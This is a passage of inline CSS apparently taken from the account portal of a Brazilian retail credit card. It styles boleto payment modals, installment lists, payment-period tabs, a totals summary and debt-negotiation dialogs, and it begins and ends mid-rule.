         display: inline-block;
         position: relative; }
         .modal-boleto .valores .parcela .holder .line {
         position: absolute;
         top: 50%;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         background-image: url('data:image/svg+xml;charset=utf-8, %3Csvg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="none" viewBox="0 0 100 100"%3E%3Cpath d="M100.002 0L-.078 89.91l.07 10.172 100.03-90.048z" color="%23000" fill-rule="evenodd" solid-color="%23000000"/%3E%3C/svg%3E');
         background-size: 100% 100%;
         width: 100%;
         height: 50%;
         overflow: hidden; }
         .modal-boleto .valores .com-desconto .property__value {
         text-align: right;
         color: #3ecf7a; }
         .modal-boleto .linha-digitavel-descricao {
         margin-bottom: 20px;
         color: #706f6f;
         font-size: 16px;
         font-weight: 400; }
         .modal-boleto .linha-digitavel {
         margin-bottom: 20px;
         border-radius: 3px;
         background-color: #f2f2f2;
         padding: 5px 10px; }
         .modal-boleto .linha-digitavel .linha-digitavel__codigo {
         line-height: 19px;
         word-wrap: break-word;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 400; }
         @media (max-width: 767px) {
         .modal-boleto .modal__actions .button {
         font-size: 14px; } }
         .modal-boleto--error.modal .modal__icon {
         display: block;
         margin: auto;
         margin-bottom: 20px;
         color: #cf3e3e;
         width: 60px;
         height: 60px; }
         .modal-boleto--error.modal .modal__icon-title {
         margin-bottom: 30px;
         text-align: center;
         letter-spacing: -0.03em;
         color: #cf3e3e;
         font-size: 24px;
         font-weight: 700; }
         .modal-boleto--error.modal .modal-boleto__texto {
         text-align: center;
         line-height: 21px;
         color: #706f6f;
         font-size: 16px;
         font-weight: 400; }
         .modal-boleto--error.modal .modal-boleto__texto strong {
         color: #1e1e1f; }
         .modal-boleto--error.modal .modal__content {
         margin-bottom: 0; }
         .modal-boleto--error.modal .modal-telefones {
         margin-top: 30px; }
         .modal-boleto--error.modal .modal-telefones .row {
         text-align: left; }
         .modal-boleto--error.modal .modal-telefones .modal-telefones__titulo {
         text-align: center;
         letter-spacing: -0.03em;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 400;
         font-style: italic; }
         .modal-boleto--error.modal .modal-telefones .modal-telefones__telefone {
         margin: 0;
         letter-spacing: -0.04em;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 700; }
         .modal-boleto--error.modal .modal-telefones .modal-telefones__telefone a {
         text-decoration: none; }
         .modal-boleto--error.modal .modal-telefones .modal-telefones__texto {
         margin: 0;
         line-height: 13px;
         letter-spacing: -0.01em;
         color: #1e1e1f;
         font-size: 12px;
         font-weight: 400; }
         .modal-boleto--error.modal .link-fale-conosco {
         display: inline-block; }
         .modal-boleto--error.modal .link-fale-conosco a {
         text-transform: inherit; }
         .box-error.box-error-boleto .template-container .card {
         padding: 40px 50px; }
         .box-error.box-error-boleto .template-container .card .card__message--error {
         color: #d71920; }
      </style>
      <style type="text/css">.tab-panel.carne-historico {
         padding: 1rem; }
         .modal-detalhe-historico .modal__content {
         margin-bottom: 0; }
         .modal-detalhe-historico .modal__title {
         margin-bottom: 5px;
         line-height: 110%;
         letter-spacing: -1.5px;
         font-size: 32px;
         font-weight: 300;
         font-style: italic; }
         .modal-detalhe-historico .modal__text {
         margin-bottom: 25px;
         font-size: 16px;
         font-weight: 300; }
         .modal-detalhe-historico .modal__text strong {
         font-weight: bold; }
         .modal-detalhe-historico .modal__lista-detalhe {
         margin-left: 0; }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         lista-pagamentos {
         display: block; }
         lista-pagamentos .loader--inverse .loader.loader--show {
         min-height: 145px; }
         .carne-historico {
         min-height: 150px; }
         .carne .carne__item {
         background: none;
         cursor: pointer; }
         .carne .carne__item:not(.selected):hover .carne__item-column time .icon-check:before, .carne .carne__item:not(.selected):hover .carne__item-column time .icon-check:after {
         background-color: #f2f2f2; }
         .carne .carne__item:last-child {
         border-bottom: none; }
         .carne .carne__item:first-child {
         border-top: none; }
         .carne .carne__item .carne__item-column.column-info {
         white-space: nowrap; }
         .carne .carne__item .carne__item-column.column-value {
         letter-spacing: -0.5px; }
         .carne .carne__item .carne__item-column.column-value strong {
         display: block; }
         .carne .carne__item .carne__item-column.column-value time {
         white-space: nowrap;
         font-size: 14px; }
         .carne .carne__item .carne__item-column.column-value time .icon-check {
         display: inline-block;
         position: relative;
         -webkit-transform: rotate(45deg) translateX(-2px) translateY(-1px);
         transform: rotate(45deg) translateX(-2px) translateY(-1px);
         margin-right: 7px;
         border: 2px solid #acacac;
         border-radius: 1px;
         width: 14px;
         height: 14px; }
         .carne .carne__item .carne__item-column.column-value time .icon-check:before, .carne .carne__item .carne__item-column.column-value time .icon-check:after {
         position: absolute;
         background-color: #fff;
         width: 13px;
         height: 13px;
         content: ""; }
         .carne .carne__item .carne__item-column.column-value time .icon-check:before {
         top: 0;
         left: -8px; }
         .carne .carne__item .carne__item-column.column-value time .icon-check:after {
         top: -3px;
         left: -3px; }
      </style>
      <style type="text/css">.cartao-renner .bg-themed, .cartao-renner .periodo-pagamento__item--active,
         .meu-cartao .cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .periodo-pagamento__item--active {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .border-themed {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed, .cartao-renner.theme-priority .periodo-pagamento__item--active {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed, .meu-cartao .periodo-pagamento__item--active,
         .cartao-renner .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .periodo-pagamento__item--active {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .border-themed {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed, .meu-cartao.theme-priority .periodo-pagamento__item--active {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         periodos-pagamentos {
         display: block;
         margin-bottom: 20px; }
         periodos-pagamentos .loader--inverse .loader.loader--show {
         min-height: 150px; }
         .periodo-pagamento {
         display: -webkit-box;
         display: flex;
         margin: 0;
         border: 1px solid #e0e0e0;
         border-radius: 17px; }
         .periodo-pagamento__item {
         display: inline-block;
         -webkit-box-flex: 1;
         flex: 1 1 auto;
         border-radius: 17px;
         cursor: pointer;
         padding: 10px 0;
         list-style: none;
         text-align: center;
         line-height: 100%;
         color: #706f6f;
         font-size: 14px;
         font-weight: 300; }
         .periodo-pagamento__item time {
         display: block;
         padding-top: 1px; }
         .periodo-pagamento__item--active {
         color: #fff;
         font-weight: 700; }
      </style>
      <style type="text/css">.modal.modal-detalhe-carne {
         width: 692px; }
         .modal-detalhe-carne .modal__content {
         position: relative;
         margin-bottom: 0; }
         .modal-detalhe-carne .modal__content .left-block {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding-right: 25px; }
         .modal-detalhe-carne .modal__content .loader--bilhete .loader__bubble {
         right: 0;
         left: auto; }
         .modal-detalhe-carne .modal__lista-detalhe {
         margin: 0 0 0 15px; }
         .modal-detalhe-carne .modal__lista-detalhe .nome-usuario {
         overflow: hidden;
         text-overflow: ellipsis;
         white-space: nowrap; }
         .modal-detalhe-carne .modal__lista-detalhe .modal__lista-detalhe__item strong.em-atraso {
         color: #cf3e3e; }
         @media (max-width: 767px) {
         .modal.modal-detalhe-carne {
         margin: 10px; }
         .modal.modal-detalhe-carne .modal__title {
         display: none; }
         .modal.modal-detalhe-carne .modal__content > .row > .column {
         padding-right: 0;
         padding-left: 0; } }
         lista-carnes .loader.loader--show {
         min-height: 150px; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .carne-page .block-carne .block__header-title {
         padding-top: 40px; } }
         .carne-controles {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         width: 100%; }
         .carne-controles__quantidade {
         text-align: center; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .carne-page .carne-controles {
         flex-wrap: wrap; }
         .carne-page .carne-controles__selecao {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .carne-page .carne-controles__ordenacao {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .carne-page .carne-controles__quantidade {
         -webkit-box-ordinal-group: 2;
         order: 1;
         margin-bottom: 10px;
         width: 100%; } }
         @media (min-width: 1024px) {
         .carne-controles__quantidade {
         margin-right: 20px;
         width: 100%;
         text-align: right; }
         .safari .carne-controles__quantidade {
         width: auto; } }
      </style>
      <style type="text/css">lista-carnes .loader.loader--show {
         min-height: 150px; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .carne-page .block-carne .block__header-title {
         padding-top: 40px; } }
         .carne-controles {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         width: 100%; }
         .carne-controles__quantidade {
         text-align: center; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .carne-page .carne-controles {
         flex-wrap: wrap; }
         .carne-page .carne-controles__selecao {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .carne-page .carne-controles__ordenacao {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .carne-page .carne-controles__quantidade {
         -webkit-box-ordinal-group: 2;
         order: 1;
         margin-bottom: 10px;
         width: 100%; } }
         @media (min-width: 1024px) {
         .carne-controles__quantidade {
         margin-right: 20px;
         width: 100%;
         text-align: right; }
         .safari .carne-controles__quantidade {
         width: auto; } }
      </style>
      <style type="text/css">mais-carnes {
         display: block;
         width: 100%; }
      </style>
      <style type="text/css">.carne-ordenacao {
         width: 175px; }
         @media (max-width: 767px) {
         .carne-ordenacao {
         width: 70px; } }
      </style>
      <style type="text/css">.quantidade-carnes {
         color: #706f6f;
         font-size: 15px; }
         .quantidade-carnes__limite,
         .quantidade-carnes__total {
         font-weight: 700; }
      </style>
      <style type="text/css">.carne-limpar-selecao.button.button--small {
         padding: 0 20px; }
         @media (min-width: 768px) {
         .carne-limpar-selecao__icon {
         margin-right: 12px; } }
      </style>
      <style type="text/css">.block-carne .nenhum-carne .block__header-title {
         position: relative;
         margin-bottom: 30px; }
         .block-carne .nenhum-carne .block__header-title:after {
         position: absolute;
         bottom: -10px;
         left: 0;
         background-color: #ebebeb;
         width: 100%;
         height: 1px;
         content: ""; }
      </style>
      <style type="text/css">.carne {
         margin-bottom: 0;
         border-collapse: collapse; }
         .carne thead,
         .carne tbody {
         border: none;
         background-color: #fff; }
         .carne td {
         -webkit-tap-highlight-color: transparent; }
         .carne th {
         padding: 10px;
         text-align: left;
         white-space: nowrap;
         color: #706f6f;
         font-size: 15px;
         font-weight: 400; }
         .carne .carne__item {
         border-bottom: 1px solid #e0e0e0;
         background-color: transparent;
         vertical-align: middle; }
         .carne .carne__item .label-adicional span {
         text-transform: capitalize; }
         .carne .carne__item.disabled .carne__item-column.column-info,
         .carne .carne__item.disabled .carne__item-column .column-info__contrato {
         color: #acacac; }
         .carne .carne__item.disabled input {
         display: none; }
         .carne .carne__item.disabled .carne__item-column.column-selector:after {
         display: block;
         position: relative;
         -webkit-transform: rotate(30deg);
         transform: rotate(30deg);
         opacity: 0.5;
         border: 1px solid #acacac;
         border-radius: 50%;
         width: 15px;
         height: 15px;
         text-align: center;
         line-height: 12px;
         color: #acacac;
         font-size: 18px;
         font-weight: 300;
         content: "/"; }
         .carne .carne__item:first-child {
         border-top: 1px solid #e0e0e0; }
         .carne .carne__item.selected {
         background-color: #ebebeb; }
         .carne .carne__item:not(.selected):hover {
         background-color: #f2f2f2; }
         .carne .carne__item .carne__item-column {
         padding: 10px;
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 400; }
         @media (max-width: 767px) {
         .carne .carne__item .carne__item-column {
         padding: 10px 5px; } }
         .carne .carne__item .carne__item-column .column-info__contrato,
         .carne .carne__item .carne__item-column .column-info__data-vencimento,
         .carne .carne__item .carne__item-column span.sep {
         color: #706f6f; }
         .carne .carne__item .carne__item-column .column-info__data-vencimento {
         font-size: 14px; }
         .carne .carne__item .carne__item-column p {
         margin: 0; }
         @media (max-width: 767px) {
         .carne .carne__item .carne__item-column.column-selector {
         padding-left: 10px; } }
         .carne .carne__item .carne__item-column.column-vencimento {
         width: 18%;
         vertical-align: top; }
         .carne .carne__item .carne__item-column.column-value {
         vertical-align: top;
         font-size: 16px; }
         @media (max-width: 767px) {
         .carne .carne__item .carne__item-column.column-value {
         padding-right: 10px; } }
         .carne .carne__item .carne__item-column.column-selector input {
         margin: 0;
         cursor: pointer; }
         @media (max-width: 767px) {
         .carne .carne__item .carne__item-column.column-info .column-info__contrato {
         font-size: 14px; } }
         .carne .carne__item .carne__item-column.column-info .column-info__contrato,
         .carne .carne__item .carne__item-column.column-info .column-info__tipo,
         .carne .carne__item .carne__item-column.column-info .column-info__parcela {
         line-height: 23px; }
         .carne .carne__item .carne__item-column.column-info .column-info__parcela {
         font-size: 14px; }
         .carne .carne__item .carne__item-column.column-info .column-info__parcela {
         white-space: nowrap; }
         .carne .carne__item .carne__item-column.column-value {
         text-align: right;
         font-weight: 700; }
         .carne .carne__item .carne__item-column.column-value strong {
         white-space: nowrap; }
         .carne .carne__item .carne__item-column.column-value.atrasado strong {
         color: #cf3e3e; }
         .carne .carne__item .carne__item-column.column-value.confirmar strong {
         color: #706f6f; }
         .carne .carne__item .carne__item-column.column-value time {
         font-size: 14px;
         font-weight: 400; }
         .carne .carne__item-logo {
         margin-right: 6px;
         width: 18px;
         height: 18px; }
         .carne .carne__item-logo .icon-themed__icon {
         padding-top: 3px; }
         .carne .column-selector {
         position: relative; }
         .carne .column-selector .column-selector__fake-input-click {
         position: absolute;
         top: 0;
         left: 0;
         z-index: 1;
         width: 100%;
         height: 100%; }
         .ie10 .carne .column-selector .column-selector__fake-input-click {
         background: rgba(0, 0, 0, 0); }
         .carne .tabela-header--valor {
         text-align: right; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .carne .carne__item .carne__item-column {
         padding: 10px 7px; }
         .carne th {
         padding: 10px 7px; } }
         @media (max-width: 767px) {
         .carne .carne__item .carne__item-column.column-value strong {
         letter-spacing: -0.6px; }
         .carne .carne__item .carne__item-column {
         letter-spacing: -0.5px;
         font-size: 15px; }
         .carne .carne__item .carne__item-column.column-info {
         padding-right: 0; }
         .carne .carne__item .carne__item-column.column-value {
         padding-left: 0; }
         .carne-page .carne {
         margin-bottom: 0; }
         .carne-page .carne .carne__item:last-child {
         border-bottom: none; } }
      </style>
      <style type="text/css">.cartao-renner .bg-themed, .cartao-renner .totalizador .totalizador__valor-descontos:after, .totalizador .cartao-renner .totalizador__valor-descontos:after,
         .meu-cartao .cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .totalizador .totalizador__valor-descontos:after,
         .totalizador .meu-cartao .cartao-renner .totalizador__valor-descontos:after {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed, .cartao-renner .totalizador .totalizador__valor-descontos:after, .totalizador .cartao-renner .totalizador__valor-descontos:after,
         .meu-cartao .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .totalizador .totalizador__valor-descontos:after,
         .totalizador .meu-cartao .cartao-renner .totalizador__valor-descontos:after {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .text-themed {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed, .cartao-renner.theme-priority .totalizador .totalizador__valor-descontos:after, .totalizador .cartao-renner.theme-priority .totalizador__valor-descontos:after {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed, .cartao-renner.theme-priority .totalizador .totalizador__valor-descontos:after, .totalizador .cartao-renner.theme-priority .totalizador__valor-descontos:after {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed {
         color: #ac8947; }
         .meu-cartao .bg-themed, .meu-cartao .totalizador .totalizador__valor-descontos:after, .totalizador .meu-cartao .totalizador__valor-descontos:after,
         .cartao-renner .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .totalizador .totalizador__valor-descontos:after,
         .totalizador .cartao-renner .meu-cartao .totalizador__valor-descontos:after {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed, .meu-cartao .totalizador .totalizador__valor-descontos:after, .totalizador .meu-cartao .totalizador__valor-descontos:after,
         .cartao-renner .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .totalizador .totalizador__valor-descontos:after,
         .totalizador .cartao-renner .meu-cartao .totalizador__valor-descontos:after {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .text-themed {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed, .meu-cartao.theme-priority .totalizador .totalizador__valor-descontos:after, .totalizador .meu-cartao.theme-priority .totalizador__valor-descontos:after {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed, .meu-cartao.theme-priority .totalizador .totalizador__valor-descontos:after, .totalizador .meu-cartao.theme-priority .totalizador__valor-descontos:after {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .totalizador table {
         margin: 0;
         border-collapse: collapse; }
         .totalizador table tbody {
         border: none;
         background-color: transparent; }
         .totalizador table td {
         padding: 22px 20px; }
         .totalizador table td:not(:last-child) {
         border-right: 1px solid #acacac; }
         .totalizador .totalizador__body {
         border: 1px solid #acacac;
         border-radius: 3px;
         background-color: #f2f2f2; }
         .totalizador .totalizador__sub-total,
         .totalizador .totalizador__valor-seguro,
         .totalizador .totalizador__valor-encargos,
         .totalizador .totalizador__valor-descontos {
         position: relative; }
         .totalizador .totalizador__sub-total:after,
         .totalizador .totalizador__valor-seguro:after,
         .totalizador .totalizador__valor-encargos:after,
         .totalizador .totalizador__valor-descontos:after {
         display: block;
         position: absolute;
         top: 50%;
         right: -12px;
         margin-top: -12px;
         border: 1px solid #acacac;
         border-radius: 50%;
         background-color: #fff;
         width: 22px;
         height: 22px;
         text-align: center;
         line-height: 20px;
         color: #706f6f;
         font-size: 18px; }
         .totalizador .totalizador__valor-total {
         background-color: #ebebeb; }
         .totalizador .totalizador__sub-total:after,
         .totalizador .totalizador__valor-seguro:after {
         content: "+"; }
         .totalizador .totalizador__valor-encargos:after {
         content: "-"; }
         .totalizador .totalizador__valor-descontos:after {
         color: #fff;
         content: "="; }
         .totalizador .totalizador__valor-label,
         .totalizador .totalizador__valor-numero {
         text-align: center;
         white-space: nowrap; }
         .totalizador .totalizador__valor-label {
         color: #706f6f;
         font-size: 13px;
         font-weight: 400; }
         .totalizador .totalizador__valor-numero:not(.text-themed) {
         line-height: 1.375rem;
         color: #1e1e1f;
         font-size: 18px; }
         .totalizador .totalizador__valor-total .totalizador__valor-numero {
         line-height: 1.5rem;
         letter-spacing: -0.5px;
         color: #1e1e1f;
         font-size: 22px;
         font-weight: bold; }
         @media (min-width: 1024px) {
         .ie .totalizador .totalizador__valor-total {
         width: 35%; } }
         .modal.modal-a-confirmar {
         width: 460px; }
         @media (max-width: 1023px) {
         .totalizador .totalizador__body {
         position: relative; }
         .totalizador table {
         display: block; }
         .totalizador table tbody,
         .totalizador table tr,
         .totalizador table td {
         display: block;
         text-align: left; }
         .totalizador table td {
         margin: 0 20px;
         padding: 22px 0; }
         .totalizador table td:not(:last-child) {
         border-right: none;
         border-bottom: 1px solid #acacac;
         padding: 10px 0; }
         .totalizador .totalizador__sub-total:after,
         .totalizador .totalizador__valor-seguro:after,
         .totalizador .totalizador__valor-encargos:after,
         .totalizador .totalizador__valor-descontos:after {
         display: none !important; }
         .totalizador .totalizador__valor-label,
         .totalizador .totalizador__valor-numero {
         display: inline-block;
         width: 49%;
         text-align: left; }
         .totalizador .totalizador__valor-numero {
         text-align: right; }
         .totalizador .totalizador__toggle {
         position: relative;
         top: 1px;
         z-index: 2;
         margin: 0 auto;
         width: 40px;
         height: 20px;
         overflow: hidden; }
         .totalizador .totalizador__toggle .totalizador__toggle-inner {
         border-top: 1px solid #acacac;
         border-radius: 50%;
         background-color: #f2f2f2;
         width: 40px;
         height: 40px; }
         .totalizador .totalizador__toggle .collapsible-arrow {
         padding: 5px; }
         .totalizador .totalizador__valor-total {
         padding: 22px 20px; }
         .totalizador .totalizador__valor-total .totalizador__valor-numero {
         text-align: left; }
         .totalizador .collapsible-arrow {
         -webkit-transition: 0.25s;
         transition: 0.25s; }
         .totalizador.collapsible--collapsed .collapsible-arrow {
         -webkit-transform: rotate(-135deg);
         transform: rotate(-135deg); }
         .totalizador.collapsible--expanded .collapsible-arrow {
         -webkit-transform: rotate(45deg) translateY(-5px) translateX(-5px);
         transform: rotate(45deg) translateY(-5px) translateX(-5px); } }
         .totalizador {
         position: -webkit-sticky;
         position: sticky;
         bottom: 0; }
         @media (max-width: 767px) {
         .totalizador,
         .totalizador.sticky-element {
         bottom: 50px; }
         .ie .totalizador,
         .totalizador.sticky-element {
         bottom: 0; } }
         .totalizador.sticky-element {
         position: fixed; }
      </style>
      <style type="text/css">.tab-panel.carne-historico {
         padding: 1rem; }
         .modal-detalhe-historico .modal__content {
         margin-bottom: 0; }
         .modal-detalhe-historico .modal__title {
         margin-bottom: 5px;
         line-height: 110%;
         letter-spacing: -1.5px;
         font-size: 32px;
         font-weight: 300;
         font-style: italic; }
         .modal-detalhe-historico .modal__text {
         margin-bottom: 25px;
         font-size: 16px;
         font-weight: 300; }
         .modal-detalhe-historico .modal__text strong {
         font-weight: bold; }
         .modal-detalhe-historico .modal__lista-detalhe {
         margin-left: 0; }
         .modal.modal-detalhe-carne {
         width: 692px; }
         .modal-detalhe-carne .modal__content {
         position: relative;
         margin-bottom: 0; }
         .modal-detalhe-carne .modal__content .left-block {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         -webkit-box-pack: justify;
         justify-content: space-between;
         padding-right: 25px; }
         .modal-detalhe-carne .modal__content .loader--bilhete .loader__bubble {
         right: 0;
         left: auto; }
         .modal-detalhe-carne .modal__lista-detalhe {
         margin: 0 0 0 15px; }
         .modal-detalhe-carne .modal__lista-detalhe .nome-usuario {
         overflow: hidden;
         text-overflow: ellipsis;
         white-space: nowrap; }
         .modal-detalhe-carne .modal__lista-detalhe .modal__lista-detalhe__item strong.em-atraso {
         color: #cf3e3e; }
         @media (max-width: 767px) {
         .modal.modal-detalhe-carne {
         margin: 10px; }
         .modal.modal-detalhe-carne .modal__title {
         display: none; }
         .modal.modal-detalhe-carne .modal__content > .row > .column {
         padding-right: 0;
         padding-left: 0; } }
         lista-carnes .loader.loader--show {
         min-height: 150px; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .carne-page .block-carne .block__header-title {
         padding-top: 40px; } }
         .carne-controles {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         width: 100%; }
         .carne-controles__quantidade {
         text-align: center; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .carne-page .carne-controles {
         flex-wrap: wrap; }
         .carne-page .carne-controles__selecao {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .carne-page .carne-controles__ordenacao {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .carne-page .carne-controles__quantidade {
         -webkit-box-ordinal-group: 2;
         order: 1;
         margin-bottom: 10px;
         width: 100%; } }
         @media (min-width: 1024px) {
         .carne-controles__quantidade {
         margin-right: 20px;
         width: 100%;
         text-align: right; }
         .safari .carne-controles__quantidade {
         width: auto; } }
         .modal.modal-detalhe .modal__title {
         margin-bottom: 5px;
         line-height: 110%;
         letter-spacing: -1.5px;
         font-size: 32px;
         font-weight: 300;
         font-style: italic; }
         .modal.modal-detalhe .modal__text {
         margin-bottom: 25px;
         font-size: 16px;
         font-weight: 300; }
         .modal.modal-detalhe .modal__text strong {
         font-weight: bold; }
         .modal.modal-detalhe .modal__content--divider {
         position: relative;
         margin-bottom: 0; }
         .modal.modal-detalhe .modal__content--divider:before {
         display: block;
         position: absolute;
         top: 0;
         left: 50%;
         background-color: #ebebeb;
         width: 1px;
         height: 100%;
         content: ""; }
         .modal__lista-detalhe {
         padding: 0;
         list-style: none;
         font-size: 12px; }
         .modal__lista-detalhe .modal__lista-detalhe__item {
         padding: 15px 0;
         line-height: 100%; }
         .modal__lista-detalhe .modal__lista-detalhe__item:not(:last-child) {
         border-bottom: 1px solid #e0e0e0; }
         .modal__lista-detalhe .modal__lista-detalhe__item.modal__lista-detalhe__item--no-border {
         border-bottom: none; }
         .modal__lista-detalhe .modal__lista-detalhe__item .text-left,
         .modal__lista-detalhe .modal__lista-detalhe__item .text-right {
         display: inline-block;
         width: 49%; }
         .modal__lista-detalhe .modal__lista-detalhe__item strong {
         font-size: 13px; }
         @media (max-width: 767px) {
         .modal.modal-detalhe .modal__title {
         font-size: 20px; }
         .modal.modal-detalhe .modal__text {
         margin-bottom: 30px;
         line-height: 110%;
         letter-spacing: -1.5px;
         font-size: 20px;
         font-weight: 300;
         font-style: italic; }
         .modal.modal-detalhe .modal__content--divider:before {
         display: none; }
         .modal.modal-detalhe .modal__lista-detalhe {
         margin: 10px 0; }
         .modal.modal-detalhe .modal__lista-detalhe .modal__lista-detalhe__item {
         padding: 10px 0; }
         .modal.modal-detalhe .left-block .row .column.row {
         margin-right: 0;
         margin-left: 0;
         padding-right: 0.625rem;
         padding-left: 0.625rem; }
         .modal.modal-detalhe .left-block .column:nth-of-type(2) {
         padding: 0 !important;
         letter-spacing: -0.2px; }
         .modal.modal-detalhe .left-block .column:nth-of-type(2) .property__icon {
         margin-right: 5px; } }
         .ie10 #carne-section tab-header-item {
         width: 50%; }
      </style>
      <style type="text/css">.pesquisa-divida {
         margin-bottom: 20px;
         border: 5px solid #1e1e1f;
         padding: 35px; }
         .pesquisa-divida h2,
         .pesquisa-divida p {
         margin: 0;
         text-align: center; }
         .pesquisa-divida p {
         margin-top: 20px;
         font-weight: 300; }
         .pesquisa-divida .buttons {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: reverse;
         flex-direction: row-reverse;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin-top: 30px; }
         .pesquisa-divida .buttons .button {
         width: calc(50% - 10px); }
         @media (max-width: 767px) {
         .pesquisa-divida {
         padding: 15px; }
         .pesquisa-divida h2 {
         font-size: 20px; }
         .pesquisa-divida p {
         margin-top: 10px;
         font-size: 14px; }
         .pesquisa-divida .buttons {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin-top: 20px; }
         .pesquisa-divida .buttons .button {
         width: 100%;
         height: 35px;
         line-height: 30px;
         font-size: 14px; }
         .pesquisa-divida .buttons .button:first-child {
         margin-bottom: 10px; } }
      </style>
      <style type="text/css">.modal.modal__divida-inegociavel {
         padding: 28px 30px 45px;
         width: 322px; }
         .modal.modal__divida-inegociavel .modal__title {
